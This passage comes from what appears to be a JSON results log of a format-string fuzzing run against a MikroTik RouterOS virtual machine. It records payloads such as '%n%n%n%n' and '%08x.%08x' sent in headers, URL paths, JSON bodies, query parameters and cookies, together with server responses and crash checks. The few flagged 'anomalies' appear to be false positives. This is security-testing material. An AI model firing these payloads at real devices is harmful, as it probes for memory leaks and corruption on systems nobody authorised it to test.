+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 45,
+      "category": "header_format_string",
+      "name": "header_X-Forwarded-For_crash_deref",
+      "description": "X-Forwarded-For: crash_deref",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:24.110985",
+      "details": {
+        "header": "X-Forwarded-For",
+        "payload_name": "crash_deref",
+        "payload_value": "%s%s%s%s",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:19 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 46,
+      "category": "header_format_string",
+      "name": "header_X-Forwarded-For_write_test",
+      "description": "X-Forwarded-For: write_test",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:35.641856",
+      "details": {
+        "header": "X-Forwarded-For",
+        "payload_name": "write_test",
+        "payload_value": "%n%n%n%n",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:29 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        },
+        "crash_check": {
+          "crash": false,
+          "pre_uptime": "2h11m2s",
+          "post_uptime": "2h11m13s"
+        }
+      }
+    },
+    {
+      "id": 47,
+      "category": "header_format_string",
+      "name": "header_X-Forwarded-For_structured_leak",
+      "description": "X-Forwarded-For: structured_leak",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:35.950010",
+      "details": {
+        "header": "X-Forwarded-For",
+        "payload_name": "structured_leak",
+        "payload_value": "%08x.%08x.%08x.%08x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:31 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 48,
+      "category": "header_format_string",
+      "name": "header_X-Forwarded-For_direct_param_access",
+      "description": "X-Forwarded-For: direct_param_access",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:36.270170",
+      "details": {
+        "header": "X-Forwarded-For",
+        "payload_name": "direct_param_access",
+        "payload_value": "AAAA%1$x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:31 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 49,
+      "category": "url_path_format_string",
+      "name": "path_hex_leak",
+      "description": "URL path format string: /webfig/%x%x%x%x",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:36.574322",
+      "details": {
+        "path": "/webfig/%x%x%x%x",
+        "payload_type": "info_leak_hex",
+        "raw_socket": {
+          "status_code": 404,
+          "response_length": 310,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:32 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n"
+        },
+        "requests_lib": {
+          "status_code": 404,
+          "response_length": 99,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": ""
+        }
+      }
+    },
+    {
+      "id": 50,
+      "category": "url_path_format_string",
+      "name": "path_ptr_leak",
+      "description": "URL path format string: /rest/%p%p%p",
+      "result": "ANOMALY",
+      "anomaly": true,
+      "timestamp": "2026-02-16T14:10:36.894482",
+      "details": {
+        "path": "/rest/%p%p%p",
+        "payload_type": "info_leak_ptr",
+        "raw_socket": {
+          "status_code": 401,
+          "response_length": 302,
+          "leaked_data": [
+            "31536000"
+          ],
+          "anomaly": true,
+          "details": "Format specifiers not reflected literally. Total 1 leak indicators found.",
+          "response_snippet": "HTTP/1.1 401 Unauthorized\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 38\r\nContent-Type: application/json\r\nDate: Mon, 16 Feb 2026 21:50:32 GMT\r\nExpires: Tue, 16 Feb 2027 21:50:32 GMT\r\nWWW-Authenticate: Basic\r\nX-Frame-Options: sameorigin\r\n\r\n{\"error\":401,\"message\":\"Unauthorized\"}"
+        },
+        "requests_lib": {
+          "status_code": 400,
+          "response_length": 92,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": ""
+        }
+      }
+    },
+    {
+      "id": 51,
+      "category": "url_path_format_string",
+      "name": "path_write_test",
+      "description": "URL path format string: /%n",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:48.132098",
+      "details": {
+        "path": "/%n",
+        "payload_type": "write_test",
+        "raw_socket": {
+          "status_code": 404,
+          "response_length": 310,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:42 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n"
+        },
+        "requests_lib": {
+          "status_code": 404,
+          "response_length": 99,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": ""
+        },
+        "crash_check": {
+          "crash": false,
+          "pre_uptime": "2h11m15s",
+          "post_uptime": "2h11m26s"
+        }
+      }
+    },
+    {
+      "id": 52,
+      "category": "url_path_format_string",
+      "name": "path_structured",
+      "description": "URL path format string: /AAAA%08x.%08x.%08x",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:48.436250",
+      "details": {
+        "path": "/AAAA%08x.%08x.%08x",
+        "payload_type": "structured_leak",
+        "raw_socket": {
+          "status_code": 404,
+          "response_length": 310,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:43 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n"
+        },
+        "requests_lib": {
+          "status_code": 404,
+          "response_length": 99,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": ""
+        }
+      }
+    },
+    {
+      "id": 53,
+      "category": "json_body_format_string",
+      "name": "json_hex_leak",
+      "description": "JSON body format string: info_leak_hex",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:48.740402",
+      "details": {
+        "json_body": {
+          "note": "%x%x%x%x%x%x%x%x"
+        },
+        "payload_type": "info_leak_hex",
+        "set_response": {
+          "status_code": 200,
+          "response_length": 2,
+          "leaked_data": [],
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "[]"
+        },
+        "readback_response": {
+          "status_code": 200,
+          "stored_value": "%x%x%x%x%x%x%x%x",
+          "leaked_data": [],
+          "details": "Payload reflected literally (not interpreted as format). ",
+          "response_snippet": "{\"note\":\"%x%x%x%x%x%x%x%x\",\"show-at-cli-login\":\"false\",\"show-at-login\":\"true\"}"
+        }
+      }
+    },
+    {
+      "id": 54,
+      "category": "json_body_format_string",
+      "name": "json_ptr_leak",
+      "description": "JSON body format string: info_leak_ptr",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:49.048556",
+      "details": {
+        "json_body": {
+          "note": "%p%p%p%p%p%p%p%p"
+        },
+        "payload_type": "info_leak_ptr",
+        "set_response": {
+          "status_code": 200,
+          "response_length": 2,
+          "leaked_data": [],
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "[]"
+        },
+        "readback_response": {
+          "status_code": 200,
+          "stored_value": "%p%p%p%p%p%p%p%p",
+          "leaked_data": [],
+          "details": "Payload reflected literally (not interpreted as format). ",
+          "response_snippet": "{\"note\":\"%p%p%p%p%p%p%p%p\",\"show-at-cli-login\":\"false\",\"show-at-login\":\"true\"}"
+        }
+      }
+    },
+    {
+      "id": 55,
+      "category": "json_body_format_string",
+      "name": "json_structured",
+      "description": "JSON body format string: structured_leak",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:49.352708",
+      "details": {
+        "json_body": {
+          "note": "%08x.%08x.%08x.%08x"
+        },
+        "payload_type": "structured_leak",
+        "set_response": {
+          "status_code": 200,
+          "response_length": 2,
+          "leaked_data": [],
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "[]"
+        },
+        "readback_response": {
+          "status_code": 200,
+          "stored_value": "%08x.%08x.%08x.%08x",
+          "leaked_data": [],
+          "details": "Payload reflected literally (not interpreted as format). ",
+          "response_snippet": "{\"note\":\"%08x.%08x.%08x.%08x\",\"show-at-cli-login\":\"false\",\"show-at-login\":\"true\"}"
+        }
+      }
+    },
+    {
+      "id": 56,
+      "category": "json_body_format_string",
+      "name": "json_direct",
+      "description": "JSON body format string: direct_param_access",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:49.660862",
+      "details": {
+        "json_body": {
+          "note": "AAAA%1$x%2$x%3$x%4$x"
+        },
+        "payload_type": "direct_param_access",
+        "set_response": {
+          "status_code": 200,
+          "response_length": 2,
+          "leaked_data": [],
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "[]"
+        },
+        "readback_response": {
+          "status_code": 200,
+          "stored_value": "AAAA%1$x%2$x%3$x%4$x",
+          "leaked_data": [],
+          "details": "Payload reflected literally (not interpreted as format). ",
+          "response_snippet": "{\"note\":\"AAAA%1$x%2$x%3$x%4$x\",\"show-at-cli-login\":\"false\",\"show-at-login\":\"true\"}"
+        }
+      }
+    },
+    {
+      "id": 57,
+      "category": "query_param_format_string",
+      "name": "query_hex_leak",
+      "description": "Query param format string: /webfig/?foo=%x%x%x%x",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:49.989026",
+      "details": {
+        "path": "/webfig/?foo=%x%x%x%x",
+        "payload_value": "%x%x%x%x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:45 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 58,
+      "category": "query_param_format_string",
+      "name": "query_ptr_leak",
+      "description": "Query param format string: /rest/system/resource?%p=%p",
+      "result": "ANOMALY",
+      "anomaly": true,
+      "timestamp": "2026-02-16T14:10:50.301182",
+      "details": {
+        "path": "/rest/system/resource?%p=%p",
+        "payload_value": "%p=%p",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 672,
+          "leaked_data": [
+            "31536000",
+            "73211904",
+            "93564928"
+          ],
+          "anomaly": true,
+          "details": "Format specifiers not reflected literally. Total 3 leak indicators found.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 442\r\nContent-Type: application/json\r\nDate: Mon, 16 Feb 2026 21:50:45 GMT\r\nExpires: Tue, 16 Feb 2027 21:50:45 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n{\"architecture-name\":\"x86_64\",\"board-name\":\"CHR innotek GmbH VirtualBox\",\"build-time\":\"2026-01-30 09:17:54\",\"cpu\":\"AMD\",\"cpu-count\":\"1\",\"cpu-frequency\":\"4391\",\"cpu-load\":\"4\",\"factory-software\":\"7.1\",\"free-hdd-space\":\"73211904\",\"free-memory\":\"837640192\",\"platform\":\"Mikro... [truncated, total 672 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 442,
+          "leaked_data": [
+            "73211904",
+            "93564928"
+          ],
+          "anomaly": true,
+          "details": "Format specifiers not reflected literally. Total 2 leak indicators found.",
+          "response_snippet": "{\"architecture-name\":\"x86_64\",\"board-name\":\"CHR innotek GmbH VirtualBox\",\"build-time\":\"2026-01-30 09:17:54\",\"cpu\":\"AMD\",\"cpu-count\":\"1\",\"cpu-frequency\":\"4391\",\"cpu-load\":\"4\",\"factory-software\":\"7.1\",\"free-hdd-space\":\"73211904\",\"free-memory\":\"837640192\",\"platform\":\"MikroTik\",\"total-hdd-space\":\"93564928\",\"total-memory\":\"1073741824\",\"uptime\":\"2h11m28s\",\"version\":\"7.20.8 (long-term)\",\"write-sect-since-reboot\":\"3128\",\"write-sect-total\":\"3128\"}"
+        }
+      }
+    },
+    {
+      "id": 59,
+      "category": "query_param_format_string",
+      "name": "query_structured",
+      "description": "Query param format string: /webfig/?q=%08x.%08x.%08x.%08x",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:50.617340",
+      "details": {
+        "path": "/webfig/?q=%08x.%08x.%08x.%08x",
+        "payload_value": "%08x.%08x.%08x.%08x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:46 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 60,
+      "category": "query_param_format_string",
+      "name": "query_direct",
+      "description": "Query param format string: /webfig/?x=AAAA%1$x",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:50.937500",
+      "details": {
+        "path": "/webfig/?x=AAAA%1$x",
+        "payload_value": "AAAA%1$x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:46 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 61,
+      "category": "cookie_format_string",
+      "name": "cookie_hex_leak",
+      "description": "%x chain in session cookie",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:51.253658",
+      "details": {
+        "cookie_value": "session=%x%x%x%x%x%x%x%x; id=test",
+        "description": "%x chain in session cookie",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:46 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 62,
+      "category": "cookie_format_string",
+      "name": "cookie_ptr_leak",
+      "description": "%p in session and id cookies",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:51.573818",
+      "details": {
+        "cookie_value": "session=%p%p%p%p; id=%p%p",
+        "description": "%p in session and id cookies",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:47 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 63,
+      "category": "cookie_format_string",
+      "name": "cookie_structured",
+      "description": "%08x structured in cookies",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:51.893978",
+      "details": {
+        "cookie_value": "session=%08x.%08x.%08x; path=%08x",
+        "description": "%08x structured in cookies",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
